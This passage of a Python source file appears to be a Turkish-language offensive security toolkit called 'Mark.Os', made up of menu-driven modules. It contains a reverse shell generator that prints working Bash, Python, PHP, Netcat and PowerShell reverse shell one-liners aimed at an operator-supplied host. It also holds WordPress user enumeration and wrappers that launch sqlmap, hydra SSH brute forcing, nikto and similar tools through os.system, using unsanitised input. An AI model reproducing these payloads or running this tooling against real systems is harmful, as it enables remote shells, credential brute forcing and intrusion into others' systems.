    if not url.startswith(('http://','https://')): url = 'http://'+url
    
    wp = False
    for s in ['/wp-login.php','/wp-admin/','/wp-content/','/wp-includes/','/xmlrpc.php']:
        try:
            r = requests.get(f"{url}{s}", timeout=8, allow_redirects=False)
            if r.status_code in [200,301,302,403]:
                print(f"{Fore.GREEN}[+] WP: {s} ({r.status_code})"); wp = True
        except: pass
    
    if wp:
        for i in range(1,6):
            try:
                r = requests.get(f"{url}/wp-json/wp/v2/users/{i}", timeout=8)
                if r.status_code == 200:
                    d = r.json()
                    print(f"{Fore.GREEN}[+] Kullanıcı: {d.get('name')} (ID: {d.get('id')})")
            except: pass
    else:
        print(f"{Fore.RED}[-] WordPress tespit edilemedi.")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 24: REVERSE SHELL GENERATOR
# ═══════════════════════════════════════════════════════════════════

def reverse_shell_generator():
    print(f"\n{Fore.YELLOW}[*] Reverse Shell Generator")
    ip = input(f"{Fore.GREEN}LHOST: ").strip()
    port = input(f"{Fore.GREEN}LPORT [4444]: ").strip() or "4444"
    if not ip: print(f"{Fore.RED}[-] IP gerekli!"); return
    
    shells = {
        "Bash": f"bash -i >& /dev/tcp/{ip}/{port} 0>&1",
        "Python": f"python3 -c 'import socket,subprocess,os;s=socket.socket();s.connect((\"{ip}\",{port}));os.dup2(s.fileno(),0);os.dup2(s.fileno(),1);os.dup2(s.fileno(),2);subprocess.call([\"/bin/sh\"])'",
        "PHP": f"php -r '$sock=fsockopen(\"{ip}\",{port});exec(\"/bin/sh -i <&3 >&3 2>&3\");'",
        "Netcat": f"nc -e /bin/sh {ip} {port}",
        "PowerShell": f"powershell -NoP -NonI -W Hidden -Exec Bypass -Command New-Object System.Net.Sockets.TCPClient(\"{ip}\",{port});$stream=$client.GetStream();[byte[]]$bytes=0..65535|%{{0}};while(($i=$stream.Read($bytes,0,$bytes.Length))-ne0){{;$data=(New-Object -TypeName System.Text.ASCIIEncoding).GetString($bytes,0,$i);$sendback=(iex $data 2>&1|Out-String);$sendback2=$sendback+\"PS \"+(pwd).Path+\"> \";$sendbyte=([text.encoding]::ASCII).GetBytes($sendback2);$stream.Write($sendbyte,0,$sendbyte.Length);$stream.Flush()}};$client.Close()"
    }
    print(f"\n{Fore.GREEN}[+] Payloads:")
    for n,p in shells.items():
        print(f"\n{Fore.CYAN}--- {n} ---\n{Fore.WHITE}{p}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 25: CIDR HESAPLAYICI
# ═══════════════════════════════════════════════════════════════════

def cidr_calculator():
    print(f"\n{Fore.YELLOW}[*] CIDR / Subnet Hesaplayıcı")
    cidr = input(f"{Fore.GREEN}CIDR (örn: 192.168.1.0/24): ").strip()
    if not cidr: return
    try:
        net = ipaddress.ip_network(cidr, strict=False)
        print(f"\n{Fore.GREEN}[+] Sonuçlar:")
        print(f"  Ağ Adresi  : {net.network_address}")
        print(f"  Broadcast  : {net.broadcast_address}")
        print(f"  Host Sayısı: {max(0, net.num_addresses-2)}")
        hosts = list(net.hosts())
        if hosts:
            print(f"  İlk Host   : {hosts[0]}")
            print(f"  Son Host   : {hosts[-1]}")
        print(f"  Netmask    : {net.netmask}")
        print(f"  Özel Ağ    : {'Evet' if net.is_private else 'Hayır'}")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 26: METADATA ÇIKARICI
# ═══════════════════════════════════════════════════════════════════

def metadata_extractor():
    print(f"\n{Fore.YELLOW}[*] Dosya Metadata Çıkarıcı")
    path = input(f"{Fore.GREEN}Dosya yolu: ").strip()
    if not path or not os.path.exists(path):
        print(f"{Fore.RED}[-] Dosya bulunamadı!"); return
    try:
        stat = os.stat(path)
        print(f"\n{Fore.GREEN}[+] Bilgiler:")
        print(f"  İsim        : {os.path.basename(path)}")
        print(f"  Boyut       : {stat.st_size} bytes")
        print(f"  Oluşturulma : {datetime.fromtimestamp(stat.st_ctime)}")
        print(f"  Değişiklik  : {datetime.fromtimestamp(stat.st_mtime)}")
        print(f"  Tam Yol     : {os.path.abspath(path)}")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 27: MAC ADRES ARACI
# ═══════════════════════════════════════════════════════════════════

def mac_tool():
    print(f"\n{Fore.YELLOW}[*] MAC Adres Aracı")
    print("1 - Rastgele MAC Üret\n2 - MAC Vendor Lookup")
    s = input(f"{Fore.GREEN}Seçim: ").strip()
    if s == "1":
        mac = ":".join(f"{random.randint(0,255):02x}" for _ in range(6))
        print(f"{Fore.GREEN}[+] {mac.upper()}")
    elif s == "2":
        mac = input(f"{Fore.GREEN}MAC: ").strip()
        if mac:
            oui = mac.replace(":","").replace("-","").replace(".","")[:6].upper()
            vendors = {"005056":"VMware","080027":"VirtualBox","000C29":"VMware",
                       "0011B1":"Intel","0016F":"Apple","A4B197":"Apple",
                       "001451":"Cisco","001E14":"Cisco","64E833":"TP-Link",
                       "C0A0BB":"TP-Link","F4EC38":"TP-Link","001B11":"TP-Link"}
            print(f"{Fore.GREEN}[+] Vendor: {vendors.get(oui, 'Bilinmiyor')} (OUI: {oui})")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              MODÜL 28: REVERSE IP LOOKUP
# ═══════════════════════════════════════════════════════════════════

def reverse_ip_lookup():
    print(f"\n{Fore.YELLOW}[*] Reverse IP Lookup")
    ip = input(f"{Fore.GREEN}IP: ").strip()
    if not ip: return
    try:
        req = urllib.request.Request(f"https://api.hackertarget.com/reverseiplookup/?q={ip}", headers={'User-Agent':'Mozilla/5.0'})
        with urllib.request.urlopen(req, timeout=15) as r:
            data = r.read().decode('utf-8',errors='ignore')
            domains = [d.strip() for d in data.split('\n') if d.strip() and 'error' not in d.lower() and 'No DNS' not in d]
            if domains:
                print(f"\n{Fore.GREEN}[+] {len(domains)} domain:")
                for d in domains[:25]: print(f"  {Fore.WHITE}{d}")
            else:
                print(f"{Fore.RED}[-] Sonuç yok.")
    except Exception as e:
        print(f"{Fore.RED}[-] {e}")
    pause()

# ═══════════════════════════════════════════════════════════════════
#              HARİCİ ARAÇ ENTEGRASYONLARI
# ═══════════════════════════════════════════════════════════════════

def nmap_run():
    def run():
        h = input(f"{Fore.GREEN}IP/Domain: ").strip()
        if h: os.system(f"nmap -sV -O --top-ports 100 {h}")
    run_tool("nmap","nmap","Nmap",run); pause()

def sqlmap_run():
    def run():
        u = input(f"{Fore.GREEN}URL: ").strip()
        if u: os.system(f"sqlmap -u '{u}' --batch --dbs --random-agent")
    run_tool("sqlmap","sqlmap","Sqlmap",run); pause()

def gobuster_run():
    def run():
        u = input(f"{Fore.GREEN}URL: ").strip()
        w = input(f"{Fore.GREEN}Wordlist [/usr/share/wordlists/dirb/common.txt]: ").strip() or "/usr/share/wordlists/dirb/common.txt"
        if u: os.system(f"gobuster dir -u {u} -w {w}")
    run_tool("gobuster","gobuster","Gobuster",run); pause()

def nikto_run():
    def run():
        u = input(f"{Fore.GREEN}URL: ").strip()
        if u: os.system(f"nikto -h {u}")
    run_tool("nikto","nikto","Nikto",run); pause()

def wpscan_run():
    def run():
        u = input(f"{Fore.GREEN}WP URL: ").strip()
        if u: os.system(f"wpscan --url {u} --enumerate u,vp,vt")
    run_tool("wpscan","wpscan","WPScan",run); pause()

def hydra_run():
    def run():
        t = input(f"{Fore.GREEN}Hedef: ").strip()
        u = input(f"{Fore.GREEN}Kullanıcı: ").strip()
        w = input(f"{Fore.GREEN}Wordlist: ").strip()
        p = input(f"{Fore.GREEN}Protokol [ssh]: ").strip() or "ssh"
        if all([t,u,w]): os.system(f"hydra -l {u} -P {w} {p}://{t}")
    run_tool("hydra","hydra","Hydra",run); pause()

# ═══════════════════════════════════════════════════════════════════
#                       ANA MENÜ
# ═══════════════════════════════════════════════════════════════════

def main():
    while True:
        banner()
        menu = f"""
{Fore.MAGENTA}╔══════════════════════════════════════════════════════════════╗
{Fore.MAGENTA}║       {Fore.CYAN}BİLGİ TOPLAMA & KEŞİF (RECON){Fore.MAGENTA}                        ║
{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════╣
{Fore.WHITE}  1  {Fore.YELLOW}- TCP Port Tarama          10 {Fore.YELLOW}- Ağ Tarama (Ping Sweep)
  2  {Fore.YELLOW}- IP Coğrafi Konum        11 {Fore.YELLOW}- HTTP Header Analizi
  3  {Fore.YELLOW}- WHOIS Sorgulama          12 {Fore.YELLOW}- SSL/TLS Sertifika
  4  {Fore.YELLOW}- DNS Enumeration          13 {Fore.YELLOW}- Banner Grabbing
  5  {Fore.YELLOW}- Subdomain Scanner        14 {Fore.YELLOW}- Encode/Decode
  6  {Fore.YELLOW}- Dizin Brute-Force        15 {Fore.YELLOW}- robots.txt & Sitemap
  7  {Fore.YELLOW}- Hash ID & Üretim         16 {Fore.YELLOW}- Reverse IP Lookup
  8  {Fore.YELLOW}- Şifre Üretici            17 {Fore.YELLOW}- CIDR Hesaplayıcı
  9  {Fore.YELLOW}- Metadata Çıkarıcı        18 {Fore.YELLOW}- MAC Adres Aracı
{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════╣
{Fore.MAGENTA}║       {Fore.CYAN}SALDIRI & ZAFİYET TESTLERİ{Fore.MAGENTA}                            ║
{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════╣
{Fore.WHITE}  19 {Fore.RED}- Brute-Force (Redray)     23 {Fore.RED}- Open Redirect Test
  20 {Fore.RED}- SQLi Tarayıcı             24 {Fore.RED}- CSRF Token Kontrol
  21 {Fore.RED}- XSS Tester                25 {Fore.RED}- Reverse Shell Gen
  22 {Fore.RED}- Clickjacking Test         26 {Fore.RED}- Wordpress Enum
{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════╣
{Fore.MAGENTA}║       {Fore.CYAN}HARİCİ ARAÇLAR (KALI){Fore.MAGENTA}                              ║
{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════╣
{Fore.WHITE}  27 {Fore.CYAN}- Nmap          30 {Fore.CYAN}- Nikto        33 {Fore.CYAN}- Hydra
  28 {Fore.CYAN}- Sqlmap        31 {Fore.CYAN}- WPScan
  29 {Fore.CYAN}- Gobuster       32 {Fore.CYAN}- Dns/Banner/Email
{Fore.MAGENTA}╠══════════════════════════════════════════════════════════════╣
{Fore.WHITE}  34 {Fore.YELLOW}- Telefon Numara OSINT
  0  {Fore.RED}- Çıkış
{Fore.MAGENTA}╚══════════════════════════════════════════════════════════════╝"""
        print(menu)
        
        try:
            secim = input(f"\n{Fore.CYAN}[?] Seçiminiz: ").strip()
        except (EOFError, KeyboardInterrupt):
            print(f"\n{Fore.GREEN}[+] Çıkılıyor..."); break
        
        # ═════ RECON MODÜLLERİ ═════
        if secim == "1": port_scanner()
        elif secim == "2": ip_geo_locator()
        elif secim == "3": whois_lookup()
        elif secim == "4": dns_enumeration()
        elif secim == "5": subdomain_scanner()
        elif secim == "6": dir_bruteforce()
        elif secim == "7": hash_identifier()
        elif secim == "8": password_generator()
        elif secim == "9": metadata_extractor()
        elif secim == "10": network_scanner()
        elif secim == "11": http_header_analyzer()
        elif secim == "12": ssl_checker()
        elif secim == "13": banner_grabbing()
        elif secim == "14": encode_decode_tool()
        elif secim == "15": robots_checker()
        elif secim == "16": reverse_ip_lookup()
        elif secim == "17": cidr_calculator()
        elif secim == "18": mac_tool()
        # ═════ SALDIRI MODÜLLERİ ═════
        elif secim == "19": redray_brute_force()
        elif secim == "20": sqli_scanner()
        elif secim == "21": xss_tester()
        elif secim == "22": clickjacking_tester()
        elif secim == "23": open_redirect_tester()
        elif secim == "24": csrf_checker()
        elif secim == "25": reverse_shell_generator()
        elif secim == "26": wordpress_enum()
        # ═════ HARİCİ ARAÇLAR ═════
        elif secim == "27": nmap_run()
        elif secim == "28": sqlmap_run()
        elif secim == "29": gobuster_run()
        elif secim == "30": nikto_run()
        elif secim == "31": wpscan_run()
        elif secim == "32":
            print(f"\n{Fore.YELLOW}[*] Alt menü:")
            print("  a - DNS Enumeration")
            print("  b - Banner Grabbing")
            print("  c - Email MX Kontrol")
            alt = input(f"{Fore.GREEN}Seçim: ").lower()
            if alt == 'a': dns_enumeration()
            elif alt == 'b': banner_grabbing()
            elif alt == 'c': email_mx_checker()
        elif secim == "33": hydra_run()
        elif secim == "34": phone_osint()
        elif secim == "0":
            print(f"{Fore.GREEN}[+] Mark.Os v2.1 kapandı. Güvenli günler!")
            break
        else:
            print(f"{Fore.RED}[-] Geçersiz seçim: {secim}")
            pause()

if __name__ == "__main__":
    main()
